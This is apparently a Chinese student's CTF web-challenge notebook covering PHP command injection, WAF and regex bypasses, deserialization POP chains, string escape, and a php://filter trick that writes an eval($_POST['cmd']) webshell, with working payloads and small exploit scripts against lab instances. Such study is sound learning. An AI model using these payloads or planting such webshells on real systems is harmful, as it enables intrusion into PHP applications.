做题笔记

[TOC]



### [CISCN 2019初赛]Love Math已解决

c=system('cat /flag')
?c=($_GET[a])($_GET[b])&a=system&b=cat /flag

实践的来：get=eval($_GET[a]);&a=system(%27cat%20/f*%27);

php 中是可以用 { } 来代替 [ ] 的

这样也可以

##### [UUCTF 2022 新生赛]ez_upload

[[UUCTF 2022 新生赛\]ez_upload | NSSCTF](https://www.nssctf.cn/problem/3094)

Apache，版本是2.4.10考虑到解析漏洞。

[Apache解析漏洞-CSDN博客](https://blog.csdn.net/weixin_44174581/article/details/119387616)

##### 2023/11/13

phpinfo();查看被禁的函数

$_REQUEST这个函数，这个是可以接受$_GET,$_POST,$_Cookie，

![1699886185096](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1699886185096.png)



2023/11/14

学习了XXE

[[HNCTF 2022 WEEK2\]easy_unser | NSSCTF](https://www.nssctf.cn/problem/2951)

在反序列化中，如果有_wakeup(),private，也就是说，要先序列化，url编码，在改变量数目

2023/11/26

[[广东强网杯 2021 团队组\]love_Pokemon | NSSCTF](https://www.nssctf.cn/problem/634)

od可以以8进制读取。

有脚本可以8进制转字符串

payload:

```
od%09/F[B-Z][@-Z]G
```

![1700998117328](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1700998117328.png)

[[NCTF 2018\]Easy_Audit | NSSCTF](https://www.nssctf.cn/problem/963)

```
<?php
highlight_file(__FILE__);
error_reporting(0);
if($_REQUEST){
    foreach ($_REQUEST as $key => $value) {
        if(preg_match('/[a-zA-Z]/i', $value))   die('waf..');
    }
}

if($_SERVER){
    if(preg_match('/yulige|flag|nctf/i', $_SERVER['QUERY_STRING']))  die('waf..');
}

if(isset($_GET['yulige'])){
    if(!(substr($_GET['yulige'], 32) === md5($_GET['yulige']))){         //日爆md5!!!!!!
        die('waf..');
    }else{
        if(preg_match('/nctfisfun$/', $_GET['nctf']) && $_GET['nctf'] !== 'nctfisfun'){
            $getflag = file_get_contents($_GET['flag']);
        }
        if(isset($getflag) && $getflag === 'ccc_liubi'){
            include 'flag.php';
            echo $flag;
        }else die('waf..');
    }
}


?>
NSSCTF{5ad3c56c-75dd-4903-aee6-6ab9f8eeb7df}
```

解析：

$_REQUEST会获取post,get,cookie里的值，其中Post大于get，就是说，post,get都传入相同的变量和值，如get:xxxxx/?a=1.post:a=2

那么获取的就是post中的a的值。

$_SERVER是获取get中?后面所有的字符串。但是他对url编码不敏感，可以使url编码后在传入。

```
if(isset($_GET['yulige'])){
    if(!(substr($_GET['yulige'], 32) === md5($_GET['yulige']))){         //日爆md5!!!!!!
        die('waf..');
    }
```

这个是等式两边都是false，md5对数组返回false，substr(),如果Yulige不足32个会返回false，于是就是yulige[]=1

```
  if(preg_match('/nctfisfun$/', $_GET['nctf']) && $_GET['nctf'] !== 'nctfisfun')
```

这个是nctf变量末尾以'nctfisfun'结尾，但是还不能全等于'nctfinfun'，于是传入1nctfisfun。

最后使用data协议传入flag.

完整payload:

?%79%75%6c%69%67%65[]=1&%6e%63%74%66=%31%6e%63%74%66%69%73%66%75%6e&%66%6c%61%67=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%63%63%63%5f%6c%69%75%62%69

post:yulige=1&flag=1&nctf=2

2023/11/27

##### git  [[NCTF 2018\]全球最大交友网站 | NSSCTF](https://www.nssctf.cn/problem/961)

![1701089095304](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1701089095304.png)

![1701089138595](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1701089138595.png)

##### preg_match() [PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html) [[FBCTF 2019\]rceservice | NSSCTF](https://www.nssctf.cn/problem/1190)

![1701091912397](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1701091912397.png)

方法二：

脚本

```
import requests

payload = '{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a"*(1000000) + '"}'

res = requests.post("http://1147c940-0749-4183-b3f9-035f43b26a3d.node4.buuoj.cn:81/", data={"cmd":payload})
print(res.text)

```

2023/11/28

###### 反序列化 [[HNCTF 2022 WEEK4\]pop子和pipi美 | NSSCTF](https://www.nssctf.cn/problem/3099)

源码

```
<?php
error_reporting(0);
//flag is in f14g.php
class Popuko {
    private $No_893;
    public function POP_TEAM_EPIC(){
        $WEBSITE  = "MANGA LIFE WIN";
    }
    public function __invoke(){
        $this->append($this->No_893);
    }
    public function append($anti_takeshobo){
        include($anti_takeshobo);
    }
}

class Pipimi{
    
    public $pipi;
    public function PIPIPMI(){
        $h = "超喜欢POP子ww,你也一样对吧(举刀)";
    }
    public function __construct(){
        echo "Pipi美永远不会生气ww";
        $this->pipi = array();
    }

    public function __get($corepop){
        $function = $this->p;
        return $function();
    }
}
class Goodsisters{

    public function PopukoPipimi(){
        $is = "Good sisters";
    }

    public $kiminonawa,$str;

    public function __construct($file='index.php'){
        $this->kiminonawa = $file;
        echo 'Welcome to HNCTF2022 ,';
        echo 'This is '.$this->kiminonawa."<br>";
    }
    public function __toString(){
        return $this->str->kiminonawa;
    }

    public function __wakeup(){
        if(preg_match("/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\.\./i", $this->kiminonawa)) {
            echo "仲良ピース!";
            $this->kiminonawa = "index.php";
        }
    }
}

if(isset($_GET['pop'])) @unserialize($_GET['pop']);  

else{
    $a=new Goodsisters;
    if(isset($_GET['pop_EP']) && $_GET['pop_EP'] == "ep683045"){
        highlight_file(__FILE__);
        echo '欸嘿,你也喜欢pop子~对吧ww';
    }
}
```

解

```
<?php

class Popuko {
    private $No_893='php://filter/read=convert.base64-encode/resource=f14g.php';
  
}

class Pipimi{
   
      public $pipi;
}
class Goodsisters{

   

    public $kiminonawa,$str;

  
    public function __toString(){
        return $this->str->kiminonawa;
    }

  
}
$a=new Goodsisters;
$b = new Pipimi();
$a->kiminonawa=$a;
$a->kiminonawa->str = $b;
$a->kiminonawa->str->p=new Popuko;

echo urlencode(serialize($a));

```

###### 自增 [[HNCTF 2022 Week1\]Challenge__rce | NSSCTF](https://www.nssctf.cn/problem/2943)

###### 2023/12/1 [[羊城杯 2020\]easyser | NSSCTF](https://www.nssctf.cn/problem/1425)

死亡协议

```
public function hasaki(){
        $d   = '<?php die("nononon");?>';
        $a= $d. $this->text;
         @file_put_contents($this-> file,$a);
```

file_put_contents忘$this-file下写入$a,

$a拼接了$d,这就是死亡协议。

方法：主要利用php://filter过滤器。

- base64编码中只包含64个可打印字符，在解码的时候，遇到这64个之外的字符，就会略过
- `<?php exit; ?>`这条代码base64解码时，会解码为`phpexit`

payload:这道题的

```
   $this -> file = "php://filter/write=convert.base64-decode/resource=ameuu.php";
        $this -> text = "aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg=="; // eval($_POST['cmd']);

```

蚁剑链接

arjun扫描kali,在根目录下，扫描参数名。

2023/12/3

[ 转义[[SWPUCTF 2023 秋季新生赛\]Pingpingping | NSSCTF](https://www.nssctf.cn/problem/4499)

php会把空格和点转换为_，Ping_ip.exe就会被转义成Ping_ip_exe。

这是我们就要改为Ping[ip.exe，在php8中，[会被转义成_，后面的.就不会在被转义。

这个知识点以前做过，有印象。这次就忘了。



反序列化，字符串逃逸。[[UUCTF 2022 新生赛\]ezpop | NSSCTF](https://www.nssctf.cn/problem/3049)

```
data=hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:3:"key";s:5:"UUCTF";s:8:"basedata";s:176:"Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJzeXN0ZW0oImNhdCBmbGFnLnBocCIpOyI7fX19";s:2:"ob";N;}
```

​		我们是为了让我们这个假的成为真的。我们只能控制name，这个参数。当传进去pdata是，序列化里面就是我们这个payload的长度和字符串。

也就是说反序列化是读到我们这个payload的结尾就可以了。但是呢，我们的name长度与原来的不一样。原来的是整个payload的长度，也就是这一坨hacker+我们拼接的。这时候我们只要让hacker这一托等于原来的name数目就可以。

原来的name长度等于,一坨+我们拼接的。题目给出的是用'loveuu!'代替hacker。那么就成6个字符变为了7个。一个替换多了1个，那么只要有strlen(我们拼的)，这么多就可以了。注：hacker的个数就等于这个数值，与就是把hacker全换为'loveuu!'。

2023/12/6

###### SSTI Tornado[题库 | NSSCTF](https://www.nssctf.cn/problem)

render

[buuctf easy-tornado(cookie_secret)_-栀蓝-的博客-CSDN博客](https://blog.csdn.net/qq_54929891/article/details/123168083?ops_request_misc=%7B%22request%5Fid%22%3A%22170184563016800213082147%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170184563016800213082147&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-123168083-null-null.142^v96^pc_search_result_base1&utm_term=Tornado ctf&spm=1018.2226.3001.4187)

[[UUCTF 2022 新生赛\]ezrce | NSSCTF](https://www.nssctf.cn/problem/3051)

又做了这道题。没搞出来。

![1701848542446](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1701848542446.png)

ls />a，这是把'ls /'的执行结果写入a中去，在直接访问a就可以了

2023/12/7

###### shal,filr_het_conments() [[SWPUCTF 2023 秋季新生赛\]一键连接! | NSSCTF](https://www.nssctf.cn/problem/4498)

shal(),绕过直接传数组。

第一种：

?xxx=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=

第二种：

![1701918908335](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1701918908335.png)

2023/12/21

###### Unionde等价性的漏洞 [[ASIS 2019\]Unicorn shop | NSSCTF](https://www.nssctf.cn/problem/32)

[Unicode - Compart](https://www.compart.com/en/unicode/)

[[ASIS 2019\]Unicorn shop - 春告鳥 - 博客园 (cnblogs.com)](https://www.cnblogs.com/Cl0ud/p/12221360.html)

2023/12/22

[[NSSRound#13 Basic\]MyWeb | NSSCTF](https://www.nssctf.cn/problem/3482)

json格式，//注释，%0a换行

[[UUCTF 2022 新生赛\]funmd5 | NSSCTF](https://www.nssctf.cn/problem/3050)

```
$md5=preg_replace('/^(.*)0e(.*)$/','${1}no_science_notation!${2}',$md5);
    if(preg_match('/0e/',$md5[0])){
```

###### 这两个是矛盾的，第一个不允许又0e,第二个必须有0e,那么就用换行符%0a

![1703233498205](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1703233498205.png)

脚本时：普通jio1

2023/12/23

BUUCTF

## [RoarCTF 2019]Easy Calc

我们在传参时在num前加入空格，这样本题的[waf](https://so.csdn.net/so/search?q=waf&spm=1001.2101.3001.7020)就找不到num这个变量了，因为现在的变量叫**“** **num”**，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行

成功造成回显，但是因为黑名单是将/和单引号过滤掉的，所以我们可以使用**chr函数**将ascii代替注入的字符/

因为我们不需要查看文件类型，所以还是换成**print_r(scandir(chr(47)));**

![1703317598095](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1703317598095.png)

[[RoarCTF 2019\]Easy Calc1-CSDN博客](https://blog.csdn.net/qq_49893996/article/details/131505702?ops_request_misc=%7B%22request%5Fid%22%3A%22170331582016800225523824%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=170331582016800225523824&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-131505702-null-null.142^v96^pc_search_result_base1&utm_term=RoarCTF 2019]Easy Calc&spm=1018.2226.3001.4187)

2024/1/19，url编码，php，字符串

ctf.show](https://ctf.show/challenges)

![1705642904877](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1705642904877.png)

当拼接在一起.